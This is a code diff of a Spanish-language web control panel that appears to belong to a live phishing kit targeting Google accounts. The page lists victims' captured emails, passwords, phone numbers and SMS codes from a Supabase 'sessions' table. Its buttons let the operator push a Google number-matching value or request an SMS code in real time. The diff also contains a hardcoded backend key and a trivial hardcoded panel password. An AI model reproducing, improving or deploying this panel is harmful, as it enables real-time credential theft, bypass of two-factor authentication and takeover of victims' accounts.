@@ -3,79 +3,111 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Console Master</title>
+    <title>Master Console</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <style>
+        body { background-color: #050505; color: #a1a1aa; font-family: 'Inter', sans-serif; }
+        .card { background: #0f0f12; border: 1px solid #1f1f23; border-radius: 24px; padding: 20px; }
+        .input-num { background: #000; border: 1px solid #333; color: #eab308; font-weight: 900; border-radius: 12px; }
+        .input-num:focus { border-color: #06b6d4; outline: none; }
+    </style>
 </head>
-<body class="bg-zinc-950 text-zinc-400 font-sans p-4">
-    <header class="max-w-xl mx-auto border-b border-zinc-900 pb-4 mb-6 flex justify-between items-center">
-        <h1 class="text-white font-black italic">SV CONSOLE</h1>
-        <button onclick="clearAll()" class="text-[10px] bg-red-900/20 text-red-500 px-3 py-1 rounded">LIMPIAR</button>
-    </header>
+<body class="p-4 md:p-8">
 
-    <main id="list" class="max-w-xl mx-auto space-y-4">
-        <div class="text-center py-10">Cargando...</div>
-    </main>
+    <div id="auth-layer" class="max-w-md mx-auto mt-20 text-center">
+        <input type="password" id="key-input" placeholder="Password Key" class="w-full bg-zinc-900 p-4 rounded-xl border border-zinc-800 text-white mb-4 outline-none">
+        <button onclick="checkKey()" class="w-full bg-white text-black font-bold py-4 rounded-xl">Entrar al Panel</button>
+    </div>
+
+    <div id="admin-layer" class="hidden max-w-5xl mx-auto">
+        <header class="flex justify-between items-center mb-10 border-b border-zinc-900 pb-6">
+            <div>
+                <h1 class="text-white font-black italic text-2xl uppercase tracking-tighter">SV <span class="text-cyan-500">MASTER</span></h1>
+                <p class="text-[10px] text-zinc-600 font-bold uppercase tracking-widest">Control en Tiempo Real</p>
+            </div>
+            <button onclick="clearAll()" class="bg-red-500/10 text-red-500 px-6 py-2 rounded-full text-[10px] font-black uppercase tracking-widest border border-red-500/20">Limpiar Todo</button>
+        </header>
+
+        <div id="list" class="grid gap-6 grid-cols-1 md:grid-cols-2 lg:grid-cols-3">
+            <!-- Data -->
+        </div>
+    </div>
 
     <script>
         const S_URL = "https://eyrvplemxhnootpjzkav.supabase.co";
         const S_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImV5cnZwbGVteGhub290cGp6a2F2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjgyNTEwMDksImV4cCI6MjA4MzgyNzAwOX0.YxrnHYnBkQLqPuVH5izQdYYgL7GVZQgSG1h89sDVd0g";
         const client = supabase.createClient(S_URL, S_KEY);
 
+        function checkKey() {
+            if(document.getElementById('key-input').value === "sebas22") {
+                document.getElementById('auth-layer').style.display = 'none';
+                document.getElementById('admin-layer').classList.remove('hidden');
+                init();
+            }
+        }
+
         async function load() {
             const { data } = await client.from('sessions').select('*').order('updated_at', { ascending: false });
             const list = document.getElementById('list');
-            if(!data || data.length === 0) { list.innerHTML = "<p class='text-center'>Sin sesiones</p>"; return; }
+            if(!data || data.length === 0) { list.innerHTML = "<p class='col-span-full text-center py-20 text-zinc-800 font-bold'>ESPERANDO CONEXIONES...</p>"; return; }
 
-            list.innerHTML = data.map(s => `
-                <div class="bg-zinc-900 p-5 rounded-2xl border border-zinc-800">
-                    <div class="flex justify-between mb-4">
-                        <div>
-                            <p class="text-xs font-bold text-blue-500 mb-1 uppercase">${s.step}</p>
-                            <p class="text-white font-bold">${s.email || '---'}</p>
-                            <p class="text-[10px] font-mono text-zinc-500">${s.password || '---'}</p>
-                        </div>
-                        <button onclick="delS('${s.session_id}')" class="text-zinc-700">×</button>
-                    </div>
+            list.innerHTML = data.map(s => {
+                // Preservar lo que el admin está escribiendo
+                const oldInput = document.getElementById(`in-${s.session_id}`);
+                const currentVal = (oldInput && document.activeElement === oldInput) ? oldInput.value : (s.target_num || '');
+
+                return `
+                <div class="card relative">
+                    <button onclick="delS('${s.session_id}')" class="absolute top-4 right-4 text-zinc-700 text-xl">×</button>
                     
-                    <div class="flex gap-2 mb-4">
-                        <input type="number" id="n-${s.session_id}" value="${s.target_num || ''}" placeholder="G-#" 
-                               class="w-16 bg-black border border-zinc-700 text-yellow-500 font-bold text-center rounded-xl">
-                        <button onclick="sendNum('${s.session_id}')" class="flex-grow bg-blue-600 text-white font-bold py-3 rounded-xl text-xs uppercase">Poner Número</button>
+                    <div class="mb-4">
+                        <span class="text-[9px] font-black text-cyan-500 uppercase tracking-widest">${s.step}</span>
+                        <h2 class="text-white font-bold truncate">${s.email || 'Conectando...'}</h2>
+                        <p class="text-xs text-zinc-500 font-mono">${s.password || '---'}</p>
+                    </div>
+
+                    <div class="bg-black/60 p-4 rounded-2xl border border-zinc-800 mb-4">
+                        <p class="text-[9px] font-bold text-zinc-600 mb-2 uppercase">Número Google (G-#)</p>
+                        <div class="flex gap-2">
+                            <input type="number" id="in-${s.session_id}" value="${currentVal}" placeholder="--" 
+                                   class="input-num w-20 p-3 text-2xl text-center outline-none">
+                            <button onclick="sendNum('${s.session_id}')" class="flex-grow bg-blue-600 text-white font-black rounded-xl text-[10px] uppercase">Enviar Número</button>
+                        </div>
                     </div>
 
                     <div class="grid grid-cols-2 gap-2">
-                        <button onclick="changeStep('${s.session_id}', 'sms')" class="bg-zinc-800 text-white py-3 rounded-xl text-[10px] uppercase">Pedir SMS</button>
-                        <button onclick="changeStep('${s.session_id}', 'login')" class="bg-zinc-800 text-zinc-500 py-3 rounded-xl text-[10px] uppercase">Reset</button>
+                        <button onclick="goStep('${s.session_id}', 'sms')" class="bg-zinc-800 text-white py-3 rounded-xl text-[10px] font-bold uppercase hover:bg-zinc-700">Pedir SMS</button>
+                        <button onclick="goStep('${s.session_id}', 'login')" class="bg-zinc-900 text-zinc-600 py-3 rounded-xl text-[10px] font-bold uppercase border border-zinc-800">Reset</button>
                     </div>
 
-                    ${s.sms_code ? `<div class="mt-4 p-3 bg-green-900/20 border border-green-900/50 rounded-xl text-center"><p class="text-white font-mono text-xl font-black">${s.sms_code}</p></div>` : ''}
+                    <div class="mt-4 flex justify-between items-center text-[10px] font-mono">
+                        <span class="text-zinc-600">📞 ${s.phone || 'N/A'}</span>
+                        <span class="text-cyan-500 font-bold">SMS: ${s.sms || '---'}</span>
+                    </div>
                 </div>
-            `).join('');
+            `}).join('');
         }
 
         window.sendNum = async (id) => {
-            const val = document.getElementById(`n-${id}`).value;
-            await client.from('sessions').update({ 
-                target_num: val, 
-                step: 'wait', // Forzamos el paso de espera
-                updated_at: new Date().toISOString() 
-            }).eq('session_id', id);
+            const val = document.getElementById(`in-${id}`).value;
+            await client.from('sessions').update({ target_num: val, step: 'wait', updated_at: new Date().toISOString() }).eq('session_id', id);
             load();
         };
 
-        window.changeStep = async (id, step) => {
+        window.goStep = async (id, step) => {
             await client.from('sessions').update({ step, updated_at: new Date().toISOString() }).eq('session_id', id);
             load();
         };
 
         window.delS = async (id) => { if(confirm('¿Borrar?')) await client.from('sessions').delete().eq('session_id', id); load(); };
-        window.clearAll = async () => { if(confirm('¿Limpiar todo?')) { const {data} = await client.from('sessions').select('session_id'); if(data) for(const r of data) await client.from('sessions').delete().eq('session_id', r.session_id); } load(); };
+        window.clearAll = async () => { if(confirm('¿BORRAR TODO?')) { const {data} = await client.from('sessions').select('session_id'); if(data) for(const r of data) await client.from('sessions').delete().eq('session_id', r.session_id); } load(); };
 
-        setInterval(load, 3000);
-        load();
+        function init() {
+            setInterval(load, 3000); // Actualización cada 3 seg para no saturar
+            load();
+        }
     </script>
 </body>
 </html>
-
 
